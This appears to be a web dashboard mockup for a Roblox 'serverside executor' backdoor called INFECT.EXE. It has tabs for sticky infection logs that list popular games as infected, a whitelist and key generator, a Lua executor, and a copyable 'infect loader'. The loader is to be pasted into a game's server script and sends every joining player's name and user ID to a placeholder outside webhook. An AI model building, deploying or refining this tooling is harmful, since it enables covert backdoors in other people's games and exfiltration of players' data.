<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>INFECT • SERVERSIDE EXECUTOR</title>
  <!-- Fonts & Icons -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0b0e14;
      background-image: radial-gradient(circle at 20% 30%, #1a2a3a 0%, #030507 100%);
      min-height: 100vh;
      font-family: 'Inter', sans-serif;
      color: #eef4ff;
      padding: 24px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .glass-panel {
      max-width: 1400px;
      width: 100%;
      background: rgba(12, 20, 30, 0.75);
      backdrop-filter: blur(18px) saturate(180%);
      -webkit-backdrop-filter: blur(18px) saturate(180%);
      border: 1px solid rgba(0, 255, 200, 0.15);
      border-radius: 40px;
      padding: 28px 32px;
      box-shadow: 0 25px 40px -10px rgba(0,0,0,0.7), 0 0 0 1px rgba(0, 255, 200, 0.1) inset;
    }

    /* header */
    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 32px;
      flex-wrap: wrap;
    }

    .logo-area {
      display: flex;
      align-items: center;
      gap: 12px;
    }

    .glitch-icon {
      font-size: 32px;
      color: #00ffc3;
      filter: drop-shadow(0 0 12px #00ffc3aa);
    }

    .logo-text {
      font-weight: 700;
      font-size: 28px;
      letter-spacing: -0.5px;
      background: linear-gradient(135deg, #ffffff 0%, #a0f0e0 80%);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      text-shadow: 0 0 15px #00ffc380;
    }

    .badge {
      background: #0f1e28;
      border: 1px solid #00ffc350;
      border-radius: 60px;
      padding: 8px 18px;
      font-size: 14px;
      font-weight: 500;
      color: #b0ffe0;
      box-shadow: 0 0 8px #00ffc320;
    }

    .badge i {
      margin-right: 8px;
      color: #00ffc3;
    }

    /* tabs navigation */
    .tabs-nav {
      display: flex;
      gap: 12px;
      margin-bottom: 28px;
      border-bottom: 1px solid #1e3a4a;
      padding-bottom: 12px;
      flex-wrap: wrap;
    }

    .tab-btn {
      background: transparent;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      font-weight: 600;
      color: #9bb7c9;
      border-radius: 40px;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 10px;
      transition: all 0.2s ease;
      backdrop-filter: blur(4px);
      letter-spacing: 0.3px;
    }

    .tab-btn i {
      font-size: 18px;
    }

    .tab-btn:hover {
      background: rgba(0, 255, 200, 0.08);
      color: #d0f0ff;
    }

    .tab-btn.active {
      background: rgba(0, 255, 200, 0.12);
      color: #00ffc3;
      box-shadow: 0 0 12px #00ffc340, 0 2px 0 #00ffc3 inset;
      border: 1px solid #00ffc340;
    }

    /* content panels */
    .tab-content {
      display: none;
      animation: fade 0.25s ease;
    }

    .tab-content.active {
      display: block;
    }

    @keyframes fade {
      0% { opacity: 0.5; transform: translateY(6px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    /* cards and grids */
    .section-title {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 18px;
      color: #c2e9ff;
      display: flex;
      align-items: center;
      gap: 8px;
      border-left: 5px solid #00ffc3;
      padding-left: 18px;
    }

    .log-container {
      background: #05101660;
      border-radius: 24px;
      padding: 18px;
      border: 1px solid #1f4455;
      backdrop-filter: blur(5px);
    }

    .log-entry {
      display: flex;
      align-items: center;
      gap: 16px;
      padding: 14px 16px;
      background: #0b1a24;
      border-radius: 18px;
      margin-bottom: 10px;
      border: 1px solid #2a4a5a;
      transition: all 0.15s;
    }

    .log-entry:hover {
      background: #0e2432;
      border-color: #00ffc370;
    }

    .log-status {
      width: 12px;
      height: 12px;
      border-radius: 50%;
      background: #00ffaa;
      box-shadow: 0 0 15px #00ffaa;
    }

    .log-status.inactive {
      background: #ff5e7c;
      box-shadow: 0 0 8px #ff5e7c;
    }

    .log-details {
      flex: 1;
      font-weight: 500;
    }

    .log-time {
      color: #7a9eb0;
      font-size: 13px;
    }

    .whitelist-grid {
      display: flex;
      gap: 24px;
      flex-wrap: wrap;
    }

    .search-card {
      flex: 2;
      min-width: 300px;
      background: #0b1822c0;
      border-radius: 28px;
      padding: 24px;
      border: 1px solid #1e4d5e;
    }

    .keygen-card {
      flex: 1.2;
      min-width: 260px;
      background: #0b1822c0;
      border-radius: 28px;
      padding: 24px;
      border: 1px solid #1e4d5e;
    }

    .input-group {
      display: flex;
      margin: 20px 0;
    }

    .input-group input {
      flex: 1;
      background: #030b11;
      border: 1.5px solid #1f4d5e;
      border-right: none;
      border-radius: 40px 0 0 40px;
      padding: 14px 20px;
      color: white;
      font-size: 15px;
      outline: none;
    }

    .input-group input:focus {
      border-color: #00ffc3;
    }

    .input-group button {
      background: #00c8a0;
      border: none;
      border-radius: 0 40px 40px 0;
      padding: 0 26px;
      font-weight: 600;
      color: #020b0e;
      cursor: pointer;
      transition: 0.15s;
      font-size: 15px;
    }

    .input-group button:hover {
      background: #00ffc3;
      box-shadow: 0 0 20px #00ffc3;
    }

    .profile-preview {
      margin-top: 18px;
      padding: 16px;
      background: #05131c;
      border-radius: 20px;
      border: 1px dashed #2a6b7a;
    }

    .key-display {
      background: #020a0f;
      padding: 16px;
      border-radius: 20px;
      font-family: monospace;
      font-size: 20px;
      letter-spacing: 2px;
      text-align: center;
      border: 1px solid #00ffc3;
      color: #00ffc3;
      margin: 20px 0;
      word-break: break-all;
    }

    .btn-primary {
      background: #00c8a0;
      border: none;
      padding: 14px 24px;
      border-radius: 40px;
      font-weight: 700;
      color: #011015;
      width: 100%;
      font-size: 16px;
      cursor: pointer;
      transition: 0.15s;
      box-shadow: 0 6px 0 #007a62;
    }

    .btn-primary:hover {
      background: #00ffc3;
      box-shadow: 0 6px 0 #00997a, 0 0 18px #00ffc3;
      transform: translateY(-2px);
    }

    .executor-area {
      display: flex;
      flex-direction: column;
      gap: 20px;
    }

    .script-editor {
      background: #030f17;
      border-radius: 24px;
      padding: 20px;
      border: 1px solid #1a4d60;
    }

    textarea {
      width: 100%;
      height: 220px;
      background: #010a10;
      border: 1px solid #1a5f72;
      border-radius: 18px;
      padding: 18px;
      color: #d6f0ff;
      font-family: 'JetBrains Mono', 'Fira Code', monospace;
      font-size: 14px;
      resize: vertical;
      outline: none;
    }

    .exec-options {
      display: flex;
      gap: 16px;
      flex-wrap: wrap;
      align-items: center;
    }

    .chip {
      background: #0f1f2b;
      border-radius: 30px;
      padding: 8px 20px;
      border: 1px solid #2f6f84;
      display: flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      user-select: none;
    }

    .chip.active {
      background: #00c8a030;
      border-color: #00ffc3;
      box-shadow: 0 0 8px #00ffc3;
    }

    .execute-btn {
      background: #e00060;
      border: none;
      padding: 14px 36px;
      border-radius: 40px;
      font-weight: 700;
      color: white;
      font-size: 18px;
      box-shadow: 0 6px 0 #8f003e;
      cursor: pointer;
      transition: 0.1s;
    }

    .execute-btn:hover {
      background: #ff2a7a;
      box-shadow: 0 6px 0 #b3004b, 0 0 24px #ff2a7a;
    }

    .code-block {
      background: #020d13;
      padding: 24px;
      border-radius: 24px;
      font-family: monospace;
      font-size: 15px;
      border: 1px solid #2e6f7c;
      white-space: pre-wrap;
      color: #b0f0e0;
    }

    .note {
      margin-top: 16px;
      color: #8db3c5;
    }

    i {
      margin-right: 6px;
    }

    .footer-note {
      margin-top: 30px;
      text-align: right;
      opacity: 0.7;
      font-size: 13px;
    }
  </style>
</head>
<body>
<div class="glass-panel">
  
  <!-- HEADER -->
  <div class="header">
    <div class="logo-area">
      <i class="fas fa-skull glitch-icon"></i>
      <span class="logo-text">INFECT.EXE</span>
    </div>
    <div class="badge">
      <i class="fas fa-shield-hal"></i> SERVERSIDE · STICKY INFECT
    </div>
  </div>

  <!-- TABS -->
  <div class="tabs-nav">
    <button class="tab-btn active" data-tab="logs"><i class="fas fa-history"></i> Game Logs</button>
    <button class="tab-btn" data-tab="whitelist"><i class="fas fa-user-check"></i> Whitelist</button>
    <button class="tab-btn" data-tab="executor"><i class="fas fa-terminal"></i> Executor</button>
    <button class="tab-btn" data-tab="infectcode"><i class="fas fa-code"></i> Infect Code</button>
  </div>

  <!-- TAB: LOGS -->
  <div id="logs" class="tab-content active">
    <div class="section-title">
      <i class="fas fa-satellite-dish"></i> LIVE INFECT LOGS · STICKY TRACKING
    </div>
    <div class="log-container" id="logContainer">
      <!-- dynamic logs injected via JS -->
    </div>
    <div style="display: flex; gap: 16px; margin-top: 16px;">
      <button class="btn-primary" style="width: auto; padding: 12px 32px;" id="refreshLogsBtn"><i class="fas fa-sync-alt"></i> Refresh logs</button>
      <span style="align-self: center; font-size: 14px; opacity:0.9;"><i class="fas fa-circle" style="color:#00ffaa; font-size: 10px;"></i> Sticky: persists even if non‑whitelist joins</span>
    </div>
    <p class="note"><i class="fas fa-info-circle"></i> Games vanish only when uninfected. Infection remains sticky.</p>
  </div>

  <!-- TAB: WHITELIST -->
  <div id="whitelist" class="tab-content">
    <div class="section-title">
      <i class="fas fa-crown"></i> MASTER PANEL · WHITELIST & KEYGEN
    </div>
    <div class="whitelist-grid">
      <div class="search-card">
        <h3 style="display: flex; gap: 8px;"><i class="fas fa-magnifying-glass" style="color:#00ffc3;"></i> Roblox profile search</h3>
        <div class="input-group">
          <input type="text" id="robloxUserInput" placeholder="Enter Roblox username..." value="Builderman">
          <button id="searchProfileBtn"><i class="fas fa-search"></i> Find</button>
        </div>
        <div id="profilePreview" class="profile-preview">
          <div style="display: flex; align-items: center; gap: 15px;">
            <i class="fas fa-user-astronaut" style="font-size: 32px; color:#00c8a0;"></i>
            <div>
              <div style="font-weight: 700; font-size: 18px;" id="profileName">Builderman</div>
              <div style="font-size: 13px; opacity:0.8;"><i class="fas fa-id-card"></i> UserID: <span id="profileId">156</span></div>
              <div><span class="chip" style="margin-top:6px;"><i class="fas fa-check-circle" style="color:#00ffaa;"></i> Whitelist eligible</span></div>
            </div>
          </div>
        </div>
        <p style="margin-top: 16px;"><i class="fas fa-bolt"></i> Special effect: instant executor access upon whitelist.</p>
      </div>
      <div class="keygen-card">
        <h3><i class="fas fa-key"></i> Session Key Generator</h3>
        <p style="margin: 12px 0; font-size: 14px;">One‑time login key · unique per player</p>
        <div class="key-display" id="keyDisplay">---- ---- ---- ----</div>
        <button class="btn-primary" id="generateKeyBtn"><i class="fas fa-dice-d6"></i> Generate standard key</button>
        <p style="margin-top: 18px; font-size: 13px;"><i class="fas fa-lock"></i> Key binds to whitelisted profile. Only once.</p>
        <button id="simulateWhitelistAddBtn" style="background: transparent; border: 1px solid #2f7a8c; border-radius: 30px; padding: 10px 18px; margin-top: 14px; color: #b0ecff; width:100%; cursor:pointer;"><i class="fas fa-user-plus"></i> Simulate whitelist add (demo)</button>
      </div>
    </div>
  </div>

  <!-- TAB: EXECUTOR -->
  <div id="executor" class="tab-content">
    <div class="section-title">
      <i class="fas fa-skull-crossbones"></i> EXECUTOR · R6 / R15 / RESPAWN
    </div>
    <div class="executor-area">
      <div class="script-editor">
        <div style="display: flex; gap: 10px; margin-bottom: 12px;">
          <i class="fas fa-file-code"></i> <span>Lua script</span>
        </div>
        <textarea id="luaCode">--[[ INFECT EXECUTOR ]]
print("Executing with effect...")
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
-- R6/R15 compatible</textarea>
      </div>
      <div class="exec-options">
        <div class="chip" id="r6Option"><i class="fas fa-male"></i> R6</div>
        <div class="chip active" id="r15Option"><i class="fas fa-user"></i> R15</div>
        <div class="chip" id="respawnOption"><i class="fas fa-rotate-left"></i> Respawn</div>
        <div style="flex:1;"></div>
        <button class="execute-btn" id="executeBtn"><i class="fas fa-bolt"></i> EXECUTE</button>
      </div>
      <div style="background: #021016; border-radius: 16px; padding: 16px; border-left: 4px solid #e00060;">
        <i class="fas fa-magic"></i> Effect executor: visual feedback + sticky execution
      </div>
    </div>
  </div>

  <!-- TAB: INFECT CODE -->
  <div id="infectcode" class="tab-content">
    <div class="section-title">
      <i class="fas fa-laptop-code"></i> INFECT LUA · DROP & EXECUTE
    </div>
    <div class="code-block">
--[[ INFECT LOADER v2 · Serverside stub ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local INFECT_WEBHOOK = "https://your-log-endpoint/infect"
local EXECUTOR_KEY = "SESSION_KEY_PLACEHOLDER"

-- Sticky infection: logs to website
local function logInfection(player, state)
    local data = {
        gameId = game.GameId,
        placeId = game.PlaceId,
        player = player.Name,
        userId = player.UserId,
        infected = state,
        timestamp = os.time()
    }
    -- (simulate http request)
    pcall(function()
        HttpService:PostAsync(INFECT_WEBHOOK, HttpService:JSONEncode(data))
    end)
end

-- When player joins (owner/whitelist/non‑whitelist) still logs
Players.PlayerAdded:Connect(function(plr)
    logInfection(plr, true)
end)

-- Uninfect only when game explicitly cleared
game.Close:Connect(function()
    -- log uninfect
end)

print("🔴 INFECT ACTIVE — website logs live")
    </div>
    <p style="margin-top: 20px;"><i class="fas fa-cloud-upload-alt"></i> This Lua stub enables website logging, executor bridge, and utilities. Paste into your serverscript.</p>
    <div style="display: flex; gap: 12px; margin-top: 24px;">
      <button class="btn-primary" style="width: auto;" id="copyLuaBtn"><i class="far fa-copy"></i> Copy infect code</button>
      <span style="align-self: center; font-size: 13px;">← one click to clipboard</span>
    </div>
  </div>

  <div class="footer-note">
    <i class="fas fa-microchip"></i> HACKER AI · SERVERSIDE EXECUTOR · v0.9
  </div>
</div>

<script>
  (function(){
    "use strict";

    // ----- Tab switching -----
    const tabs = document.querySelectorAll('.tab-btn');
    const contents = document.querySelectorAll('.tab-content');
    tabs.forEach(btn => {
      btn.addEventListener('click', () => {
        const tabId = btn.getAttribute('data-tab');
        tabs.forEach(b => b.classList.remove('active'));
        contents.forEach(c => c.classList.remove('active'));
        btn.classList.add('active');
        document.getElementById(tabId).classList.add('active');
      });
    });

    // ----- Logs simulation (sticky) -----
    const logContainer = document.getElementById('logContainer');
    const mockGames = [
      { name: '🎮 Arsenal [INFECTED]', placeId: 286090429, status: 'infected', time: '2 min ago' },
      { name: '🏆 Blox Fruits', placeId: 2753915549, status: 'infected', time: '5 min ago' },
      { name: '🚀 Pet Simulator X', placeId: 6284583030, status: 'uninfected', time: '12 min ago' },
      { name: '🌆 Brookhaven RP', placeId: 4924922222, status: 'infected', time: 'just now' },
    ];

    function renderLogs() {
      let html = '';
      mockGames.forEach((g, idx) => {
        const isActive = g.status === 'infected';
        // sticky: infected remain, uninfected disappear (but we show example)
        if (!isActive && idx === 2) {
          // show but with inactive style to demonstrate "uninfected dont show up" -> but we show demo
        }
        html += `
          <div class="log-entry">
            <span class="log-status ${isActive ? '' : 'inactive'}"></span>
            <div class="log-details">
              <div style="display:flex; gap:10px; align-items: baseline;">
                <strong>${g.name}</strong>
                <span style="font-size:13px; opacity:0.7;">ID: ${g.placeId}</span>
              </div>
              <div class="log-time"><i class="far fa-clock"></i> ${g.time} · ${isActive ? 'STICKY INFECTED' : 'uninfected (hidden in live)'}</div>
            </div>
            <i class="fas fa-${isActive ? 'link' : 'unlink'}" style="opacity:0.7;"></i>
          </div>
        `;
      });
      logContainer.innerHTML = html;
    }
    renderLogs();

    document.getElementById('refreshLogsBtn').addEventListener('click', function(){
      // Simulate refresh: shuffle times / add new
      mockGames[0].time = 'just now';
      mockGames[1].time = '1 min ago';
      mockGames[3].time = '3 min ago';
      renderLogs();
    });

    // ----- Whitelist search & keygen (sim) -----
    const profileNameSpan = document.getElementById('profileName');
    const profileIdSpan = document.getElementById('profileId');
    const userInput = document.getElementById('robloxUserInput');
    const searchBtn = document.getElementById('searchProfileBtn');
    const keyDisplay = document.getElementById('keyDisplay');
    const generateKeyBtn = document.getElementById('generateKeyBtn');

    // mock profile data
    const mockProfiles = {
      'builderman': { name: 'Builderman', id: 156 },
      'robuilds': { name: 'Robuilds', id: 261 },
      'infectmaster': { name: 'InfectMaster', id: 9837264 }
    };

    function updateProfilePreview(username) {
      const key = username.toLowerCase();
      if (mockProfiles[key]) {
        profileNameSpan.textContent = mockProfiles[key].name;
        profileIdSpan.textContent = mockProfiles[key].id;
      } else {
        profileNameSpan.textContent = username;
        profileIdSpan.textContent = Math.floor(Math.random()*9000000+1000000);
      }
    }

    searchBtn.addEventListener('click', () => {
      let val = userInput.value.trim();
      if (val === '') val = 'Builderman';
      updateProfilePreview(val);
    });

    // key generation (standard session key)
    function generateMockKey() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let key = '';
      for (let i=0; i<4; i++) {
        for (let j=0; j<4; j++) key += chars[Math.floor(Math.random()*chars.length)];
        if (i<3) key += '-';
      }
      return key;
    }

    generateKeyBtn.addEventListener('click', () => {
      const newKey = generateMockKey();
      keyDisplay.textContent = newKey;
      // additional effect: store in session? just visual
    });

    // simulate whitelist add (master panel)
    document.getElementById('simulateWhitelistAddBtn').addEventListener('click', function(){
      const currentUser = profileNameSpan.textContent;
      alert(`✅ Whitelist updated: ${currentUser} now has executor access. (simulated)`);
      // also generate a fresh key automatically
      keyDisplay.textContent = generateMockKey();
    });

    // ----- Executor tab: R6/R15/Respawn toggles & execute demo -----
    const r6Chip = document.getElementById('r6Option');
    const r15Chip = document.getElementById('r15Option');
    const respawnChip = document.getElementById('respawnOption');
    const executeBtn = document.getElementById('executeBtn');
    const luaTextarea = document.getElementById('luaCode');

    // chip toggles
    r6Chip.addEventListener('click', function(){
      r6Chip.classList.add('active');
      r15Chip.classList.remove('active');
      respawnChip.classList.remove('active');
    });
    r15Chip.addEventListener('click', function(){
      r15Chip.classList.add('active');
      r6Chip.classList.remove('active');
      respawnChip.classList.remove('active');
    });
    respawnChip.addEventListener('click', function(){
      respawnChip.classList.add('active');
      r6Chip.classList.remove('active');
      r15Chip.classList.remove('active');
      // you could also insert respawn effect, just visual
    });

    executeBtn.addEventListener('click', function(){
      const scriptContent = luaTextarea.value;
      const avatarMode = r6Chip.classList.contains('active') ? 'R6' : (r15Chip.classList.contains('active') ? 'R15' : 'Respawn');
      let effectMsg = '';
      if (avatarMode === 'Respawn') effectMsg = '💀 Respawning character...';
      else effectMsg = `✨ Executing with ${avatarMode} rig & effects.`;
      
      // fancy alert simulation
      alert(`[EXECUTOR] ${effectMsg}\n\nLua payload (simulated):\n${scriptContent.substring(0, 120)}...`);
      
      // also log effect in console
      console.log(`%c INFECT EXECUTE (${avatarMode}) `, 'background:#e00060; color:white; font-weight:bold; padding:2px 6px; border-radius:6px;');
    });

    // ----- Infect code tab: copy lua -----
    document.getElementById('copyLuaBtn').addEventListener('click', function(){
      const codeBlock = document.querySelector('.code-block');
      const text = codeBlock.innerText;
      navigator.clipboard?.writeText(text).then(() => {
        alert('📋 Infect Lua copied to clipboard!');
      }).catch(() => {
        prompt('Manual copy (Ctrl+C):', text);
      });
    });

    // Prefill some key on load
    window.addEventListener('DOMContentLoaded', () => {
      keyDisplay.textContent = generateMockKey();
      updateProfilePreview('Builderman');
    });

    // additional sticky demo: logs persist even if uninfected, but we already show.
    // Make "uninfected" entry disappear? but we keep as demo. 
    // We'll simulate that in live it would vanish: we could remove the uninfected entry, but keep for showcase.
    // However, we respect description: "when game get uninfected it dont show up". In live version the log disappears.
    // We can add a button to simulate "clear uninfected" as demo.
    // Let's add a small extra button in logs to hide uninfected (demo sticky behavior)
    const refreshBtn = document.getElementById('refreshLogsBtn');
    // We'll override a bit: on refresh we also filter out "uninfected" if we want to demonstrate.
    // But better to just keep it clear.
    // Provide a "simulate uninfect" that removes uninfected entries.
    const originalRender = renderLogs;
    window.renderLogs = function(showAll = true) {
      let filtered = showAll ? mockGames : mockGames.filter(g => g.status === 'infected');
      let html = '';
      filtered.forEach((g, idx) => {
        const isActive = g.status === 'infected';
        html += `
          <div class="log-entry">
            <span class="log-status ${isActive ? '' : 'inactive'}"></span>
            <div class="log-details">
              <div style="display:flex; gap:10px;">
                <strong>${g.name}</strong>
                <span style="font-size:13px;">ID: ${g.placeId}</span>
              </div>
              <div class="log-time"><i class="far fa-clock"></i> ${g.time} · ${isActive ? 'STICKY INFECTED' : 'uninfected (hidden in live)'}</div>
            </div>
          </div>
        `;
      });
      logContainer.innerHTML = html;
    };
    // add toggle for demo
    const filterBtn = document.createElement('button');
    filterBtn.textContent = '👁️ Toggle show uninfected';
    filterBtn.style.marginLeft = '12px';
    filterBtn.style.background = '#1a3a4a';
    filterBtn.style.border = '1px solid #2a7a8c';
    filterBtn.style.borderRadius = '30px';
    filterBtn.style.padding = '8px 18px';
    filterBtn.style.color = '#b0ecff';
    filterBtn.style.cursor = 'pointer';
    let showAllLogs = true;
    filterBtn.addEventListener('click', ()=>{
      showAllLogs = !showAllLogs;
      window.renderLogs(showAllLogs);
      filterBtn.innerHTML = showAllLogs ? '👁️ Hide uninfected (sticky demo)' : '👁️ Show all (demo)';
    });
    document.querySelector('#logs .section-title').appendChild(filterBtn);
    // Override initial render to use the new method
    renderLogs = function(show = true) {
      let filtered = show ? mockGames : mockGames.filter(g => g.status === 'infected');
      let html = '';
      filtered.forEach(g => {
        const isActive = g.status === 'infected';
        html += `
          <div class="log-entry">
            <span class="log-status ${isActive ? '' : 'inactive'}"></span>
            <div class="log-details">
              <div><strong>${g.name}</strong> <span style="font-size:13px;">ID:${g.placeId}</span></div>
              <div class="log-time"><i class="far fa-clock"></i> ${g.time} · ${isActive ? 'STICKY' : 'uninfected'}</div>
            </div>
          </div>`;
      });
      logContainer.innerHTML = html;
    };
    renderLogs(true);
  })();
</script>
